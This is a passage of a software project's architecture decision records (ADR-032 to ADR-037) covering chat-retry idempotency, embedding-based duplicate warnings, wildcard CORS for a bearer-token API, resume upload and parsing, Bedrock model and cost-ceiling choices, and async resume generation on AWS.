Slice 2b builds the first real chat client, which needs a defined retry story before its network-error handling is written. A related latent issue surfaced during this review: `session_id` is client-echoed straight into the SK **without format validation** — a client could submit a value containing `#` and distort the SK structure. Blast radius is bounded (the PK is always the caller's own `USER#<sub>`, and `assert_sk_prefix` confines writes to `CONVO#`), but it violates the "keys are constructed, never concatenated from raw input" spirit of §4.2.4.

### Decision
- **`POST /chat` accepts an optional `client_message_id`** — a client-minted ULID identifying the user message for this logical turn. The first-party client (slice 2b) always sends it: minted once when the user hits send, reused verbatim on every retry of that turn.
- **The server uses it as the `message_id`** in the SK and persists the user message with a `ConditionExpression: attribute_not_exists(PK)` conditional put. A `ConditionalCheckFailedException` means "this is a retry, the message is already durable" — the handler treats it as success and proceeds to the Bedrock call (re-running inference on retry is the *point* of retrying).
- **History replay excludes the item whose `message_id` equals the incoming `client_message_id`**, so a retried turn's prompt contains the message exactly once (it is appended as the new turn, not replayed from history).
- **Both `client_message_id` and `session_id` are validated as well-formed ULIDs** (26-character Crockford base32) before being embedded in the SK. Invalid → 400. This closes the unvalidated-`session_id` gap in the same change.
- **When `client_message_id` is absent, the server mints one** — today's behavior, and the same optional-with-fallback convention `session_id` already uses. Callers that don't supply it don't get retry idempotency; the first-party client always supplies it.

### Alternatives considered
- **Content-based dedupe** (hash of message text + recency window). Heuristic — it misfires on genuinely repeated identical messages ("yes", "done", "same as last time"), which are common in chat. Rejected: identity should come from the client's intent, not from content similarity.
- **Make the field required** (400 when absent). One code path, strongest contract — but it breaks the already-deployed dev API and every smoke-test invocation for no MVP gain, and it diverges from the established `session_id` optional-with-fallback convention. Rejected for now; revisit if a second client ever appears.
- **Do nothing until it hurts.** The duplicate is harmless to storage but not to prompt quality, and the fix is cheapest now, while the handler is fresh and before the 2b client hard-codes a retry behavior around the old semantics. Rejected.

### Consequences
- ✅ Chat-turn retry becomes idempotent end-to-end, matching the `entry_id` pattern of §3.1.4 — both write paths now share one idiom: *the party that initiates the action mints the ID; conditional put makes replays no-ops*.
- ✅ `session_id` gains the format validation it should always have had.
- ⚠️ A client-minted ULID carries the client's clock. Skew can slightly misorder a user message against server-minted assistant ULIDs in the same session's SK sort. Acceptable at single-user MVP: within a turn, the user message is minted before the assistant reply exists, so per-turn ordering holds in practice.
- ⚠️ Idempotency is opt-in by contract. Documented; the only real client opts in.

### Cross-cloud parallel
Client-generated idempotency keys are the industry-wide answer to "retried writes must not duplicate": Stripe's `Idempotency-Key` header, Azure's `x-ms-client-request-id`, GCP's `requestId` on mutating APIs. The portable lesson: only the *originator* of a request can distinguish "retry of the same intent" from "new identical intent," so the originator must name the intent.

---

## ADR-033: Semantic duplicate detection at confirm — warn, not block

**Status:** Accepted
**Date:** 2026-07-12

### Context
Entry-write idempotency (§3.1.4) is keyed on the `entry_id` ULID minted when a proposal card is created. It makes *retries of the same proposal card* no-ops — but it says nothing about the same accomplishment described a *second time*. Slice 2b's UI testing surfaced this concretely: re-describing an award or project in a fresh chat message mints a new `entry_id`, so it confirms as a brand-new entry ("Saved", 201). Two genuine duplicates this produced in dev had to be hard-deleted by hand.

Slice 3 changes what is cheaply possible. It lands `dynamodb:Query` on `career_crud` (for `GET /entries`, the AP-10 full read), and **every entry already carries a Titan embedding computed at write time** (ADR-024). So at confirm time `career_crud` can compare the new entry's just-computed vector against the user's existing entries and detect near-duplicates — with **no new Bedrock cost** (the embedding is already in hand) and reusing the in-Lambda cosine-similarity primitive that ADR-016 retrieval needs for slices 6 and 7 regardless.

The question this ADR settles: *what to do when a likely duplicate is detected* — and the mechanics (threshold, response shape).

### Decision
Detect at **confirm time**, **warn but never block**, and let the user be the authority on whether it's truly a duplicate.

- **Where.** In `career_crud`'s `POST /entries` handler, after Pydantic validation and the (already-required) Titan embedding of the candidate, and *before* the conditional `PutItem`.
- **How.** Query the caller's `ENTRY#` items (AP-10), compute cosine similarity of the new embedding against each stored embedding, and take the maximum. The cosine helper lives in the **shared layer** (`careervault` package) so slices 6/7 reuse it.
- **Threshold.** A near-duplicate is `max_similarity >= DUP_SIMILARITY_THRESHOLD`, an env var defaulting to **0.90** (Titan v2 vectors; paraphrases of one accomplishment sit high). Env-var, not hard-coded, so it tunes against real dev data without a code change — matching the model-ID-in-env config discipline (§4.3, §4.2.3). It changes in lockstep with a deploy, which is fine for a tuning knob.
- **Response shape (warn-not-block).** When a duplicate is suspected *and the client has not acknowledged it*, return **`409 Conflict`** with `{ "message": "possible_duplicate", "entry_id": "<the-candidate-ULID>", "possible_duplicates": [ { "entry_id", "entry_type", "title", "similarity" }, ... ] }`. The entry is **not** written. The proposal card renders "This looks similar to … — Save anyway?"; clicking re-`POST`s the *same* `entry_id` with **`acknowledge_duplicate: true`**, which skips the check and writes. Because the `entry_id` is preserved, the acknowledged write is still idempotent under §3.1.4.
- **Contract.** This adds `409` to the `POST /entries` status contract (§3.1.5: 201 created · 200 idempotent duplicate · **409 possible duplicate, unacknowledged** · 422 validation · 500 embedding/DDB). The first-party client handles it; a caller that ignores 409 simply never saves the entry, which is a safe failure.

### Alternatives considered
- **Block / refuse outright.** Strongest guard, but false positives *strand* legitimately-similar-but-distinct entries — two certs from the same vendor, two awards from one program, a promotion at the same employer. The user, not a cosine threshold, is the authority on whether two accomplishments are the same. Rejected.
- **Content/text-hash dedupe.** Cheap and stateless, but paraphrases don't hash-match — which is *exactly* the case §3.1.4 already misses. Embedding similarity is the tool that fits the miss. Rejected (also rejected for the same reason in ADR-032's chat-turn context).
- **Detect at read/dashboard time** ("possible duplicates" grouping on the list view) instead of at confirm. Doesn't prevent the write, so the corpus still accretes dupes; a merge/dedupe tool over already-saved entries is a heavier v1.1 feature. Confirm-time catches it before it exists. Rejected for MVP.
- **A GSI or dedicated similarity index.** Contradicts ADR-028 (no GSIs at MVP); the full read is single-digit RCUs and milliseconds at this corpus size (§2.5). Rejected.
- **Save first, warn after (201 + `possible_duplicates` in the body).** Truly non-blocking, but the dupe is already written and "undo" means a delete round-trip. The 409-gate is barely more friction (one click) and keeps the corpus clean by default. Rejected.

### Consequences
- ✅ Closes the gap §3.1.4 leaves open: the same accomplishment reworded is caught *before* it is written, not discovered later as clutter.
- ✅ No new Bedrock cost — the comparison reuses the write-time embedding. Marginal cost is the AP-10 Query (single-digit RCUs) plus in-Lambda cosine (microseconds per vector).
- ✅ Builds the in-Lambda cosine-similarity primitive ADR-016 requires for slices 6 (resume retrieval) and 7 (chat over data). Slice 3 is where it first pays rent.
- ✅ Warn-not-block keeps the user as the final authority; a false positive costs one extra click, never a lost entry.
- ⚠️ The threshold is a heuristic. False negatives fall back to today's behavior (a dupe saves — now deletable via this slice's `DELETE`). The 0.90 default is a starting point to validate against real dev entries and tune.
- ⚠️ The check reads all of a user's entries on every confirm — linear with corpus size, the same AP-10 tradeoff ADR-028 already accepts. Fine to low-thousands; revisit with the GSI trigger in ADR-028 if it ever degrades.
- ⚠️ `409` is a new status on `POST /entries`; §3.1.5 and the client both learn it. A non-acknowledging caller can't save a flagged entry — an intentional, safe-side failure.

### Cross-cloud parallel
"Embed once, compare cosine, let a human adjudicate" is provider-neutral: the same flow runs on Azure (`AzureOpenAIClient` embeddings + in-app or AI Search vector query) and GCP (Vertex embeddings + Matching Engine). A managed vector store would push the similarity search server-side rather than looping in the function — the upgrade lever ADR-016 already names — but the *decision* (warn not block, user adjudicates, client-acknowledged override) is identical everywhere.

---

## ADR-034: CORS — wildcard allow-origin for the token-auth API

**Status:** Accepted
**Date:** 2026-07-15

### Context
Slice 4 puts the frontend on a CloudFront URL while local development keeps running on
`http://localhost:5173` (Vite dev server) and — per the deployed `.env.local` — pointing at the
*same* deployed API Gateway. So the API now has **two legitimate browser origins** calling it
cross-origin: the CloudFront distribution domain and localhost. The prior template hard-coded a
single `AllowOrigin` (`CallbackUrl`, i.e. localhost), which would block the deployed app.

REST API Gateway's CORS support (and the SAM `Cors` block) emits a **single static
`Access-Control-Allow-Origin`** on the MOCK `OPTIONS` preflight — it cannot name two origins, and
the CORS spec forbids a comma-joined list or space-separated origins in that header. Supporting an
allowlist of two origins would require reflecting the request `Origin` at preflight, which on REST
API Gateway means a Lambda-backed `OPTIONS` integration replacing the mock — real machinery.

Crucially, **every request is authenticated with a Cognito JWT sent as `Authorization: Bearer`**,
and the frontend `fetch` calls do **not** set `credentials: 'include'` — there are no cookies and
no ambient session credential. In CORS terms these are *non-credentialed* requests.

### Decision
Set `Access-Control-Allow-Origin: *` for the API — both on the API Gateway `OPTIONS` preflight and
on the Lambda proxy responses (via `CORS_ALLOW_ORIGIN=*`). Do **not** set
`Access-Control-Allow-Credentials`. Cognito callback/logout URLs remain an explicit allowlist
(localhost + the CloudFront origin) — that is a separate, unrelated control and is *not* loosened.

### Alternatives considered
- **Allowlist origin reflection** (localhost + CloudFront) — tighter origin control, but requires a
  Lambda-backed `OPTIONS` handler to reflect two origins at preflight, plus reflection logic in all
  three handlers. Meaningful complexity for marginal benefit on an API with no ambient credential.
- **Single CloudFront-only origin** — would break the documented local-dev-against-deployed-API
  workflow (localhost:5173 → deployed API), which the `.env.local`/`VITE_API_BASE_URL` setup relies
  on.

### Why `*` is safe here (and would not be with cookies)
CORS is not an authentication control; it governs which origins a browser lets *read* a
cross-origin response. The security of every endpoint rests on the JWT, which a malicious origin
cannot obtain without the user completing the Cognito PKCE login (whose redirect targets stay
allowlisted). Because no cookie/credential is sent ambiently, there is no CSRF surface for `*` to
widen — a third-party page can *issue* a request but cannot attach the victim's token, and the spec
forbids pairing `Allow-Origin: *` with `Allow-Credentials: true` anyway. This is the same posture
most public Bearer-token APIs adopt. The moment the app introduces cookie-based sessions, this ADR
must be revisited: `*` would then have to become an explicit reflected allowlist.

### Consequences
- ✅ One-line, origin-agnostic config: preview builds, additional devices, or a future custom
  domain all work with no CORS change.
- ✅ No Lambda-backed `OPTIONS` handler, no per-handler reflection logic — less code to maintain.
- ✅ Local-dev-against-deployed-API keeps working unchanged.
- ⚠️ Any origin may issue requests to the API. Harmless while auth is 100% Bearer-token with no
  cookies; becomes a real concern if cookie/session auth is ever added (revisit trigger above).
- ⚠️ The Cognito callback/logout allowlist is now the *only* origin-shaped restriction; it must
  stay tight (no wildcards there).

### Cross-cloud parallel
The "wildcard CORS is fine for a non-credentialed token API, tighten it the moment cookies appear"
reasoning is provider-neutral — the same call applies to Azure API Management / Front Door and GCP
API Gateway / Cloud CDN. All three distinguish credentialed from non-credentialed CORS identically,
because it is a browser (Fetch spec) behavior, not a cloud-specific one.

---

## ADR-035: Resume upload & parse flow — presigned upload, synchronous parse, parser is parse-only

**Status:** Accepted
**Date:** 2026-07-21

### Context
Slice 5 delivers ADR-013's resume-bootstrap path: a user uploads a PDF/DOCX and gets confirmable
entry candidates instead of typing their whole career into chat. Three shape decisions were open
in the plan doc's slice-5 section, and they turned out to be coupled:

1. **How the file reaches the parser and how parse results come back** — a synchronous
   request/response call, or a presigned upload that triggers the parser via an S3 event with the
   browser polling for results.
2. **Where the Titan embedding for each entry is computed** — inside `resume_upload_parser` at
   parse time (as ADR-024's Decision and arch §4.6.2/§4.7.4 currently state), or at confirm time
   through the existing `POST /entries` path (as the slice-5 plan scope states — "bulk-confirm UI
   feeding the existing `POST /entries`"). These two statements contradict each other: if the
   parser embeds *and* confirm re-embeds, every entry is embedded twice.
3. **How the user confirms a batch of candidates** — one at a time via the slice-2b `ProposalCard`,
   or a select-all review table built for bulk.

The embedding-site question is the hinge: it decides how heavy the parser is, which decides whether
a synchronous parse is viable.

### Decision
**A lightweight, parse-only Lambda behind a synchronous API, with all embedding kept at the single
confirm site.**

- **Upload:** the browser requests a short-lived **presigned S3 PUT URL** and uploads the file
  directly to the `uploads/` prefix of the data bucket. The bytes never transit API Gateway or a
  Lambda — no base64 bloat, no 6 MB Lambda payload / 10 MB API Gateway limits in the file path.
- **Parse:** the browser then calls a **synchronous** parse endpoint with the object key.
  `resume_upload_parser` reads the object, extracts text, and makes **one Claude Haiku** pass
  (tool-use, same structured-output discipline as `chat_lambda`) to produce entry candidates,
  returned in the response body. The parser does **no** embedding and **no** DynamoDB write — it is
  a pure `file → candidates` transform. Its only Bedrock grant is Haiku (the ADR-031 inference-
  profile + regional-foundation-model ARN pattern), **not** Titan.
- **Embedding stays at confirm.** Candidates carry no vectors. Each candidate the user keeps is
  saved through the **existing `POST /entries`** path, which embeds via Titan at write time exactly
  as it has since slice 2a — so there is exactly **one** embedding site in the whole system, and the
  ADR-033 semantic-dedup + §3.1.4 idempotency machinery applies to uploaded entries for free.
- **Confirm UX:** a **select-all review table** — all candidates listed with checkboxes, per-row
  edit, and a single "Save N entries" action. The client saves the checked rows through
  `POST /entries` (sequentially or bounded-parallel), surfacing per-row saved / duplicate (409) /
  error state. Built for the 5–20 candidates a real resume yields; the one-by-one card does not
  scale to that.
- **Start synchronous; escalate only on measured latency.** A parse is now a single Haiku call
  (no N sequential Titan calls in the request path), so the request/response is expected to be a
  few seconds — well within a synchronous API budget. Both routes (presigned-URL issuance and the
  parse call) live on **`resume_upload_parser`** — one self-contained upload Lambda holding
  `s3:PutObject` + `s3:GetObject` on `uploads/${user_id}/*` plus the Haiku grant, rather than
  spreading the upload concern across two functions. The exit criterion measures real parse
  latency on a multi-page resume. **Trigger to revisit:** if measured parse latency approaches the
  API Gateway 29-second integration timeout, move parse to the async shape (S3-event-triggered
  parser writing candidates + a job-status item, browser polling) — a contained change, since the
  parser stays parse-only either way.

### Alternatives considered
- **Parser embeds candidates (matches ADR-024 as written).** The parser would run Haiku *and* N
  sequential Titan embeds, stash candidates-with-vectors somewhere between parse and confirm, and
  `POST /entries` would accept a precomputed vector to avoid re-embedding. Rejected: it spreads
  embedding across two Lambdas, needs a new candidate-holding store and a "trust this vector" branch
  in the write path, and makes the parser heavy enough to force the async job shape — all to
  pre-compute vectors the user may never confirm. Embedding at confirm only pays Titan for entries
  the user actually keeps.
- **File through the API (base64 in the request body).** No presigned-URL dance, but pushes binary
  through API Gateway (10 MB) and Lambda (6 MB request) limits and doubles bytes via base64.
  Presigned PUT is the standard S3 upload primitive and keeps the file path off the compute plane.
- **Async parse from the start** (S3 event + poll). More robust for slow parses but adds a
  job-status store, an eventing path, and polling UI before we've measured that a synchronous parse
  is actually too slow. Deferred behind the measured-latency trigger above.
- **One-by-one confirm** (reuse the 2b card). Maximum code reuse, but tedious across a 15-entry
  resume. The select-all table still reuses the per-entry field components under the hood.

### Consequences
- ✅ One embedding site for the whole system (`POST /entries`); ADR-033 dedup and §3.1.4 idempotency
  cover uploaded entries with zero new code.
- ✅ `resume_upload_parser` is a small, pure transform — easy to test (fixture file → expected
  candidates), no write IAM, Bedrock scope limited to Haiku.
- ✅ Titan is paid only for entries the user actually confirms, not for every parsed candidate.
- ✅ File bytes stay off API Gateway/Lambda via presigned PUT.
- ✅ Corrects a latent double-embed that ADR-024 + §4.6.2/§4.7.4 would have produced (see the
  ADR-024 correction note and the arch §4.6.2/§4.7.4 updates).
- ⚠️ The browser makes N `POST /entries` calls to save N candidates (one per kept row) rather than
  one bulk write. Fine at single-user scale and reuses the audited write path; a bulk-write endpoint
  is a post-MVP optimization if it ever matters.
- ⚠️ Synchronous parse is bounded by the API Gateway 29 s integration timeout; the measured-latency
  trigger above is the escape hatch to async if a large resume ever approaches it.
- ⚠️ Presigned-URL issuance needs its own small endpoint/IAM (`s3:PutObject` scoped to
  `uploads/${user_id}/*`); the parser needs `s3:GetObject` on the same prefix. Key isolation by
  user follows the §4.2.4 defense-in-depth discipline.

### Cross-cloud parallel
The pattern — client uploads to object storage via a short-lived signed URL, then a stateless
function transforms the object — is provider-neutral: Azure Blob **SAS URL** + Function, GCP Cloud
Storage **signed URL** + Cloud Function. "Keep the expensive/committing step (embedding) at one
write site and make the parser a pure transform" is an architecture-shape decision that carries
across all three.

---

## ADR-036: Resume agent — Sonnet 5 via inference profile + bounded-loop cost controls

**Status:** Accepted
**Date:** 2026-07-21 (slice 6a)

### Context
Slice 6 (resume agent) is the first code to invoke Claude **Sonnet**, so ADR-009's abstract "use
Sonnet for high-value reasoning" has to become a concrete, invokable model identifier — exactly as
ADR-031 did for Haiku in slice 2. The architecture doc (§3.2) names "Claude Sonnet" generically and
§3.2.4 pins the loop's termination constants. Two things must be nailed down before the agent code
is written:

1. **Which Sonnet, and how it's invoked.** Probing the live account (`768396678224`, us-east-1)
   confirmed ADR-031's prediction that "the resume agent will almost certainly hit the same
   inference-profile-only constraint": every current Sonnet
   (`anthropic.claude-sonnet-5`, `…-sonnet-4-6`, `…-sonnet-4-5-…`) advertises
   `inferenceTypesSupported: ["INFERENCE_PROFILE"]` only — **no `ON_DEMAND`**. The system-defined
   `us.anthropic.claude-sonnet-5` profile is `ACTIVE` and fans out to **us-east-1 / us-east-2 /
   us-west-2** — the identical three-region shape as Haiku 4.5. So ADR-031's IAM pattern transfers
   verbatim.
2. **The runaway-cost ceiling.** §3.2.4 pins `token_budget_ceiling` at **500K cumulative tokens
   (~$3–4/run at Sonnet pricing)**. That number was written against the original **$10** NFR-1.1.
   The project has since tightened to a **$5/month effective hard ceiling** (CLAUDE.md), against
   which a *single* runaway run at $3–4 would nearly consume the month. Expected per-run cost is
   ~$0.10–0.30, so the catastrophe ceiling has room to come down by ~3× without touching normal runs.

### Decision
- **Invoke Claude Sonnet 5 through the `us.` cross-region inference profile**
  (`us.anthropic.claude-sonnet-5`) for every Sonnet call in the agent (Phase 2 retrieval loop,
  Phase 3 draft, Phase 4 critique, Phase 5 revise). Phase 1 (`extract_requirements`) stays on
  **Haiku 4.5** per ADR-009/§3.2.2 (cheap decomposition), reusing the existing Haiku profile.
  The `global.` profile is rejected for the same data-residency + IAM-blast-radius reasons as
  ADR-031.
- **IAM grants `bedrock:InvokeModel` on both resource shapes** (following the ADR-031 refinement of
  §4.2.3):
  1. the inference-profile ARN
     `arn:aws:bedrock:us-east-1:<account>:inference-profile/us.anthropic.claude-sonnet-5`, **and**
  2. the underlying foundation-model ARN in **every** region the `us.` profile routes to —
     `arn:aws:bedrock:{us-east-1,us-east-2,us-west-2}::foundation-model/anthropic.claude-sonnet-5`.
  Plus the existing Haiku profile+regional ARNs (Phase 1) and the Titan on-demand ARN (Phase 2
  `search_entries` embeds the query). Model IDs live in env vars
  (`BEDROCK_SONNET_MODEL_ID`, alongside the existing `BEDROCK_HAIKU_MODEL_ID` /
  `BEDROCK_TITAN_EMBED_MODEL_ID`), kept in lockstep with the IAM ARNs.
- **Tighten the token-budget ceiling to 150K cumulative tokens (~$1/run worst case)**, down from
  §3.2.4's 500K. This **amends architecture §3.2.4**. Rationale: it sits ~5–10× above the expected
  ~$0.10–0.30 run yet caps a runaway at ~$1 — one bad run cannot eat the $5 month. `wall_clock_timeout`
  stays 240 s (Lambda timeout 300 s backstop) and Pydantic double-fail → abort. The iteration/revision
  caps are **tuned down** from §3.2.4's 15/2 (see the cost-tuning note below). All are env-tunable.
- **Reserved concurrency = 1** on `resume_agent` (via `samconfig.toml`, per ADR-030's parameterized
  §4.7.4 guard). It's the single-user, most-expensive-per-invoke Lambda; capping concurrency at 1
  is a belt-and-suspenders spend guard on top of the token ceiling — parallel runaway invocations
  can't stack.

### Alternatives considered
- **Sonnet 4.5 / 4.6 instead of 5.** Also `ACTIVE` and same price tier. Rejected: the resume is
  *the* payoff feature and ADR-009 explicitly reserves Sonnet for "anything where reasoning quality
  directly affects user value" — pick the most capable current model. A model swap is a one-line
  env + IAM change if 5 ever underperforms on cost/latency.
- **`global.` Sonnet profile.** Better capacity, but routes career-history text to any region and
  widens the foundation-model grant to all-regions — same rejection as ADR-031.
- **Keep the 500K ceiling, lean on reserved concurrency alone.** Rejected: concurrency caps *parallel*
  spend, not *per-run* spend. A single legitimate-looking run that loops pathologically still bills
  $3–4 under a 500K ceiling. The token ceiling is the per-run guard; concurrency is the parallel
  guard. Both, tuned to $5, not one.

### Consequences
- ✅ Uses current-generation Sonnet 5 the way Bedrock intends newer models to be called; ADR-031's
  inference-profile IAM discipline is reused, not reinvented.
- ✅ Per-run cost is bounded to ~$1 worst case and ~$0.10–0.30 expected — the $5 ceiling survives
  even a bad run, and reserved concurrency 1 prevents parallel stacking.
- ✅ US-only routing keeps data residency predictable and bounds the grant to three named regions.
- ⚠️ 150K is a *guess* calibrated to pricing, not to observed runs. Slice 6's exit criteria measure
  real cost-per-run; if a legitimate multi-revision run ever brushes 150K, raise it deliberately
  (env change) rather than silently — and note it here.
- ⚠️ Cross-region routing means a call may execute in us-east-2/us-west-2; invocation logs can land
  outside us-east-1 (same ADR-031 debugging caveat).

### Cross-cloud parallel
Same "logical model alias fanned across regions for capacity" indirection as ADR-031 — Azure OpenAI
*deployments*, Vertex AI global/multi-region endpoints. The per-run token-budget guard is likewise
provider-neutral: every major SDK returns `usage` token counts per call, so a cumulative-sum
ceiling is portable regardless of who serves the model.

> **Live-access correction (slice 6a, 2026-07-21 — the first deploy smoke test).** The first
> end-to-end run failed at the Phase 2 Sonnet call with
> `AccessDeniedException: anthropic.claude-sonnet-5 is not available for this account. … contact AWS
> Sales`. This is **not** IAM (Phase 1 Haiku succeeded on the same role) and **not** the ordinary
> "request access in Bedrock → Model access" toggle — the wording is account-tier/allowlist gating,
> so **Sonnet 5 is not self-serve grantable on account `768396678224` right now.** Probing the live
> account confirmed **`us.anthropic.claude-sonnet-4-6` and `…-4-5` are both accessible**;
> `…-sonnet-5` is denied. Per this ADR's own "a model swap is a one-line env + IAM change,"
> **MVP runs on Sonnet 4-6** — the *newest accessible* Sonnet (newer than the 4-5 alternative that
> was on the table when the model was chosen), same INFERENCE_PROFILE-only shape and the identical
> us-east-1/2 + us-west-2 fan-out, so IAM is unchanged. The 150K token ceiling, reserved concurrency,
> and every other decision here stand. **Revisit:** flip `SonnetInferenceProfileId` /
> `SonnetFoundationModelId` back to `…-sonnet-5` if that access is ever granted. This is the same
> class of Bedrock model-access gotcha as the Haiku use-case form (see the project memory).

> **Live-access re-diagnosis (slice 6b, 2026-07-28) — the correction above was wrong about *why*.**
> The 6a note concluded Sonnet 5 was "not self-serve grantable … account-tier/allowlist gating."
> Re-probing with the AWS agent toolkit's MCP server showed that reading was mistaken.
> `get-foundation-model-availability` returns **four** independent fields, and for
> `anthropic.claude-sonnet-5` three of them were already green — `authorizationStatus: AUTHORIZED`,
> `entitlementAvailability: AVAILABLE`, `regionAvailability: AVAILABLE`. Only
> `agreementAvailability: NOT_AVAILABLE` was set. That field means *no AWS Marketplace agreement has
> been accepted for this model*, which is **self-serve after all**:
> `list-foundation-model-agreement-offers` returned a live offer (`offer-2ykemehpsyf7g`) and
> `create-foundation-model-agreement --offer-token …` accepted it. Availability then moved
> `NOT_AVAILABLE` → `PENDING` → **`AVAILABLE`**. The 6a diagnosis stopped at the aggregate "not
> available" wording of the *runtime* error and never queried for an offer — the lesson is to read all
> four availability fields and check for a pending agreement before concluding a model is ungated.
>
> **Status as of 2026-07-28: agreement accepted and `AVAILABLE`, but `Converse` still returns the same
> `AccessDeniedException` ~30 minutes later** (both `us.` and `global.` profiles; `us.…sonnet-4-6`
> succeeds from the same identity in the same breath, so it is not IAM, not the use-case form — which
> `get-use-case-for-model-access` confirms is on file — and not the inference profile, which lists as
> `ACTIVE`). Read as entitlement propagation that cannot be forced from the client side. **The agent
> therefore still runs on Sonnet 4-6**; the switch is the same one-line `samconfig.toml` parameter flip
> this ADR always described, pending a successful probe. Tracked as backlog **B-010**.
>
> **When it lands, Sonnet 5 is also cheaper**, which inverts this ADR's original cost framing: its
> Regional CRIS rate is **$2.20/$11.00 per M tokens** vs Sonnet 4-6's **$3.30/$16.50** — roughly **33%
> less per token**, so a ~$0.39 run becomes ~$0.26 and the $5 month buys ~19 runs instead of ~13.

> **Pricing correction (slice 6b, 2026-07-28) — every run cost recorded in 6a/6b was ~10% low.**
> `agent.py`'s `_PRICE_PER_TOKEN` used the headline on-demand rates ($3/$15 Sonnet, $1/$5 Haiku), but
> **every model here is invoked through a `us.` cross-region inference profile (ADR-031), and Bedrock
> bills cross-region inference at a ~10% premium**: the rate cards give `USE1_InputTokenCount`
> (Regional CRIS) as **$3.30/$16.50** for Sonnet 4-6 and **$1.10/$5.50** for Haiku 4.5, against
> `_Global` dimensions of $3/$15 and $1/$5. So the trace/metric cost estimates — and the figures
> quoted in the tuning note above and in the 6a/6b completion notes — understate actual spend by that
> margin: the tuned run is **~$0.34, not $0.31**, and slice 6b's measured run **~$0.39, not $0.35**.
> Rates corrected in code. The 150K token ceiling is unaffected (it counts tokens, not dollars), and
> AWS Cost Explorer remains the billing truth; this only makes the in-run estimate honest.

> **Cost tuning (slice 6a, 2026-07-21 — from the first full runs).** The first successful run on
> Sonnet 4-6 measured **85K tokens / ~$0.39 / ~230 s** for a 13-entry corpus — functional and under
> the 150K ceiling, but ~2× the arch's ~$0.10–0.30 estimate and near the 240 s wall-clock budget, so
> only ~12 runs fit the $5 month. Two observations drove a tune-down of the §3.2.4 iteration/revision
> caps: (1) agentic retrieval **converged in ~5 iterations** (all 13 entries retrieved) — the 15 cap
> was never the useful bound; (2) the critique never returned PASS, so **both** revision passes ran
> and the second changed little. New defaults: **`MAX_RETRIEVAL_ITERATIONS` 15 → 8**,
> **`MAX_REVISIONS` 2 → 1** (env `AGENT_MAX_RETRIEVAL_ITERATIONS` / `AGENT_MAX_REVISIONS`). These cut
> the expensive Sonnet round-trips without touching correctness; both remain env-tunable, so raising
> them back is a config change if quality ever needs the extra passes. The token ceiling (150K) and
> wall-clock (240 s) are unchanged — they are guards, not the tuning knobs.

---

## ADR-037: Resume generation is an asynchronous job (invoke + poll), not a synchronous request

**Status:** Accepted
**Date:** 2026-07-21 (slice 6a)

### Context
Architecture §3.2.1's sequence diagram shows ``POST /resumes/generate`` returning
``201 {html_url, pdf_url, run_id}`` **synchronously**, and §3.2.2 sets a wall-clock target of "under
90 seconds." Those two statements are incompatible with the transport: the résumé API is **API
Gateway REST with a Cognito authorizer**, and API Gateway's **integration timeout maxes at 29
seconds** (hard by default). A real run — Phase 1 Haiku analysis + a Phase 2 Sonnet retrieval loop +
Phase 3 draft + Phase 4 critique + up to two Phase 5 revises — is dominated by Sonnet latency and
realistically takes **40–120 s**. A synchronous call therefore times out at 29 s while the Lambda
keeps running to completion (paying the full Sonnet cost) and the browser sees a 504.

This is the same sync-vs-async trigger ADR-035 measured its way past for the résumé *parser* (a
~3.5 s Haiku call, so sync held). The agent blows straight through it. Per the project's
"correct the doc when live reality contradicts it" principle, the synchronous depiction in §3.2.1 is
wrong for this transport and is corrected here rather than coded around.

### Decision
Model résumé generation as an **asynchronous job with a status poll**, using the RESUMERUN item as
the job record (it already exists as the trace artifact, §3.2.5 — no new entity):

1. **``POST /resumes/generate``** (API-facing, returns in < 3 s): validate the target, run the
   empty-corpus checkpoint (§3.2.6), mint ``run_id``, write a RESUMERUN item with
   ``status="pending"``, then **invoke the same Lambda asynchronously** (``InvocationType="Event"``,
   a worker payload carrying ``job="resume"`` + ids + target) and return **``202 {run_id, status:
   "pending"}``**.
2. **Worker invocation** (async, off the API Gateway request path, up to the 300 s Lambda timeout —
   the §3.2.4 backstop above the 240 s wall-clock budget): run the six-phase loop, render + upload
   the artifacts, and **overwrite** the RESUMERUN item to ``status="completed"`` (with the S3 keys,
   trace, tokens, cost, verdict) or ``status="failed"`` (with the partial trace). The one Lambda has
   two entrypoints, distinguished by whether the event is an API Gateway proxy event or a worker
   payload.
3. **``GET /resumes/{run_id}``** (API-facing): read the RESUMERUN item and return its status; when
   ``completed``, **presign fresh 1-hour GET URLs from the stored S3 keys** on each read (rather than
   persisting URLs that would expire in the item). The client polls this until terminal.

**IAM:** the function gains ``lambda:InvokeFunction`` on **its own ARN** (constructed by name via
``!Sub``, not ``!GetAtt``, to avoid a circular dependency). **Reserved concurrency becomes 2** (this
supersedes ADR-036's "1"): with self-async-invoke there can legitimately be one in-flight worker
plus a fresh ``POST``/``GET`` at once, and a cap of 1 would throttle the second. Two still bounds
parallel runaway spend (≤ 2 concurrent runs) — the per-run token ceiling (ADR-036) remains the
primary cost guard.

### Alternatives considered
- **AWS Step Functions** orchestrating the phases, API returns ``run_id``, client polls. More
  "proper" for a long job, but heavier infra (a state machine, ASL definition, extra IAM) and it
  pulls the agent loop *out* of the Lambda — directly against ADR-010's "own the in-Lambda loop for
  the learning value." Over-engineered for a single-user MVP. Revisit if the flow grows fan-out or
  needs durable step-level retries.
- **Raise the API Gateway "Maximum integration timeout" quota above 29 s.** Increases aren't
  guaranteed and rarely approach ~120 s; it also keeps a browser blocked on one HTTP call for two
  minutes and bills the whole run even if the socket drops. Rejected.
- **Keep it synchronous and force the run under 29 s** (fewer iterations, Haiku-only). Rejected —
  it guts the very reasoning quality that makes the résumé the payoff feature (ADR-009).

### Consequences
- ✅ No timeout risk; the run is bounded by the Lambda timeout (300 s) not API Gateway (29 s).
- ✅ The agent brain (``agent.py``) stays invocation-agnostic — it's a pure function of its inputs,
  so async is purely a handler/wiring concern; no loop rework.
- ✅ The RESUMERUN item unifies trace + job status; polling reads are cheap ``GetItem``s, and
  presign-on-read keeps URLs fresh without storing anything that expires.
- ✅ The 6b UI gets a natural progress affordance (poll → "generating…" → preview).
- ⚠️ Two round-trips + polling instead of one call; the client must handle ``pending`` → terminal.
  Straightforward, and the honest shape for a minute-long job.
- ⚠️ An async worker that crashes hard (OOM, un-caught) won't update the item; Lambda retries async
  invocations twice, and the client treats a long-stuck ``pending`` as failed. A visible-timestamp
  staleness check is a fine 6b/slice-9 refinement.

### Cross-cloud parallel
The "long job behind a fast API + poll for status" shape is universal: Azure Durable Functions (or a
Queue-triggered worker + status endpoint), GCP Cloud Tasks / Pub/Sub + a job doc in Firestore. The
portable lesson is that a synchronous HTTP front door has a timeout ceiling (29 s here, similar
